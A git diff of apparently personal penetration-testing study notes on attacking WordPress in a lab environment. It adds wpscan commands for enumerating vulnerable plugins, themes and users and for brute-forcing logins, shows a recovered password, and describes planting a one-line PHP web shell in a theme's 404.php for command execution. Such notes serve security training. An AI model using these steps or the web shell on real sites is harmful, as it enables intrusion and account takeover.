@@ -84,6 +84,9 @@ Automated WordPress scanner that detects: versions, plugins, themes, users, vuln
 - Supports WPVulnDB API token for vulnerability info.
 - `--enumerate` flag lists plugins, themes, users, backups, etc.
 ```bash
+ # enum vlun plugins + vlun thems
+sudo wpscan -e ap,at -t 500 --url http://ir.inlanefreight.local
+
 sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
 # [+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
 # [+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
@@ -130,8 +133,14 @@ WordPress can be attacked by abusing built-in features: brute-forcing login cred
 WPScan can brute-force WordPress users (via `xmlrpc` or `wp-login`).  
 Example attack:
 ```bash
+# enum useres 
+sudo wpscan -e u --url http://ir.inlanefreight.local
+
 sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 # output shows valid creds: john / firebird1
+
+# bruteforce via wp-login
+wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
 ```
 
 Flags:  
@@ -140,11 +149,12 @@ Flags:
 - `-P` passwords list  
 - `-t` threads  
 #### Code Execution
-After logging in as admin,Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme  (ex: Twenty Nineteen) can be selected to avoid corrupting the primary theme  and insert a simple web shell in `404.php`:
+After logging in as admin,Click on `Appearance` on the side panel and select` Theme Editor`. This page will let us edit the PHP source code directly. An inactive theme  (ex: Twenty Nineteen) can be selected to avoid corrupting the primary theme  and insert a simple web shell in `404.php`:
 ![[Pasted image 20251130193933.png]]
 ```php
 system($_GET[0]);
 ```
+>if we can't write the file we need to change the them by `Select theme to edit`
 
 Execute commands:
 ```bash
